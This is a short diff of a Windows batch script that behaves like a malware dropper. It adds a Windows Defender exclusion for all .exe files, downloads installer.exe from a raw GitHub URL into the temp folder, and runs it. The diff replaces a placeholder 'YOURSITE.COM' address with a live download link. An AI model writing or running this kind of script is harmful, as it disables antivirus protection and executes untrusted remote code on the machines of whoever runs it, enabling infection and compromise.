@@ -28,5 +28,5 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.exe' -OutFile installer.exe"
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/C2DXE/skibidpablex/refs/heads/main/installer.exe' -OutFile installer.exe"
 installer.exe
